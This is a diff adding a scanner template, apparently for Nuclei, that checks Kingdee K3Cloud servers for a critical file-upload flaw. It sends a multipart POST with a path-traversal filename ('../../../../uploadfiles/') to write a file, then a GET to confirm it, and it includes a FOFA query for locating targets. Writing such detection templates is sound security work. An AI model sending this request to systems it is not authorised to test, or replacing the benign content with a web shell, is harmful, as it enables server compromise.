@@ -1,0 +1,56 @@
+id: kingdee-k3cloud-fileupload
+
+info:
+  name: kingdee-k3cloud-fileupload
+  author: xxx
+  severity: critical
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="金蝶云星空-管理中心"
+  tags: 金蝶云星空-管理中心, 文件上传漏洞
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(8))}}"
+  file_boundary: "{{to_lower(rand_text_alpha(10))}}"
+
+http:
+  - raw:
+      - |
+        POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla
+        Connection: keep-alive
+        Content-Length: 311
+        Content-Type: multipart/form-data; boundary={{file_boundary}}
+        Accept-Encoding: gzip
+        SL-CE-SUID: 72
+         
+        --{{file_boundary}}
+        Content-Disposition: form-data; name="dbId_v"
+         
+        .
+        --{{file_boundary}}
+        Content-Disposition: form-data; name="FID"
+         
+        2022
+        --{{file_boundary}}
+        Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/{{file_name}}.txt"
+        Content-Type: text/plain
+         
+        {{file_content}}
+         
+        --{{file_boundary}}--
+        
+      - |
+        GET /k3cloud/uploadfiles/{{file_name}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_2 == 200 && contains(body_2,'{{file_content}}')"
